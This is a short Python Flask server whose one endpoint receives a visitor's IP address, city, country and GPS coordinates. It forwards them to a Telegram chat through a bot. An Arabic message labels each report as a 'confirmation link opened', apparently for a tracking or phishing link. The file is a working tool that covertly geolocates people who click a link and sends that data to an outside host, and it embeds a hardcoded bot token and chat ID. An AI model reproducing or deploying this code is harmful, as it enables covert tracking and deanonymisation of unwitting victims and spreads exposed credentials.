from flask import Flask, request
import requests

app = Flask(__name__)

BOT_TOKEN = '8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0'
CHAT_ID = '7485197107'

@app.route('/location', methods=['POST'])
def location():
    data = request.get_json()
    ip = data.get("ip", "unknown")
    city = data.get("city", "unknown")
    region = data.get("region", "unknown")
    country = data.get("country_name", "unknown")
    latitude = data.get("latitude", "unknown")
    longitude = data.get("longitude", "unknown")

    message = f"""📍 تم فتح رابط التأكيد:

IP: {ip}
الموقع: {city}, {region}, {country}
الإحداثيات: {latitude}, {longitude}
"""
    requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", params={
        "chat_id": CHAT_ID,
        "text": message
    })

    return "OK"

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=10000)
